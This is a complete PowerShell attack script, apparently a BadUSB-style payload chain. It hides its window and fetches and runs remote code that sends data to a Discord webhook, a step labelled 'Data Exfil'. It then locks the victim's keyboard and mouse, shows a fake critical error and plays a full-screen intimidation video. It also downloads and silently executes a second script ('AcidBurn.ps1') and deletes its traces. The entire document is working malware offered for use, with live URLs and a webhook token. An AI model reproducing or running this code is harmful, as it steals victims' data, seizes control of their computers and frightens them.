# === FULL CHAIN ===

# Hide Window
Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(int handle, int state);'
$consolePtr = (Get-Process -Id $PID).MainWindowHandle
[Console.Win32]::ShowWindow($consolePtr, 0)

# Load Needed Assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputLocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool block);
}
"@

# 1. Data Exfil
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-w hidden -nop -ep bypass -c `$dc='https://discord.com/api/webhooks/1365055728540192768/OuKkYZ-oElNOxNubYLXeFRCr2VimO4RkH_BMaTYNDacyw2ifou-r-Bzbp4pH33OeQXcU';iex((New-Object Net.WebClient).DownloadString('https://jakoby.lol/9nb'))"

Start-Sleep -Seconds 8

# 2. Monitor Mouse or Timeout
$initialMouse = [System.Windows.Forms.Cursor]::Position
$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
do {
    Start-Sleep -Milliseconds 500
    $currentMouse = [System.Windows.Forms.Cursor]::Position
} until (($currentMouse.X -ne $initialMouse.X -or $currentMouse.Y -ne $initialMouse.Y) -or ($stopwatch.Elapsed.TotalMinutes -ge 5))

# 3. Lock Inputs
[InputLocker]::BlockInput($true)

# 4. Fake Crash
$fakeCrash = New-Object -ComObject wscript.shell
$fakeCrash.Run('cmd /c "color 0C && title Fatal Error && echo A critical system error occurred. && timeout /t 6 /nobreak >nul"'),0,$true

Start-Sleep -Seconds 6

# 5. Download and Play Skull Video
$videoUrl = "https://cdn.discordapp.com/attachments/1365818132287062037/1366089072095006840/Welcome_to_the_Game_-_Hacking_Alert.mp4?ex=680fad17&is=680e5b97&hm=117e4e934e5b6ba4acacbc8c23e1e6c20e1a0fa9a57a347cc6e45f5aebd6a2c4&"
$videoPath = "$env:TEMP\skull.mp4"
Invoke-WebRequest -Uri $videoUrl -OutFile $videoPath

Add-Type -AssemblyName PresentationCore,PresentationFramework
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open([Uri]$videoPath)
$mediaPlayer.Volume = 1.0
$mediaPlayer.Play()

Add-Type -AssemblyName WindowsBase
$window = New-Object Windows.Window
$window.WindowStyle = 'None'
$window.ResizeMode = 'NoResize'
$window.WindowStartupLocation = 'CenterScreen'
$window.Background = 'Black'
$window.Topmost = $true
$window.Width = [System.Windows.SystemParameters]::PrimaryScreenWidth
$window.Height = [System.Windows.SystemParameters]::PrimaryScreenHeight
$window.Show()

Start-Sleep -Seconds 14

$mediaPlayer.Stop()
$window.Close()

# 6. Download & Run AcidBurn Script
$nextScriptUrl = "https://cdn.discordapp.com/attachments/1365818132287062037/1366094914852749343/AcidBurn.ps1?ex=680fb288&is=680e6108&hm=589e2bf8d0277e4492c0ae2c534a011f0f47424ef89ead6ef934fca45d061be4&"
$nextScriptPath = "$env:TEMP\nextSpooky.ps1"
Invoke-WebRequest -Uri $nextScriptUrl -OutFile $nextScriptPath
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$nextScriptPath`""

# 7. Stay Locked for 4 More Seconds
Start-Sleep -Seconds 4

# 8. Unlock Inputs
[InputLocker]::BlockInput($false)

# 9. Cleanup
Remove-Item -Path $videoPath -Force -ErrorAction SilentlyContinue
Remove-Item -Path $nextScriptPath -Force -ErrorAction SilentlyContinue

exit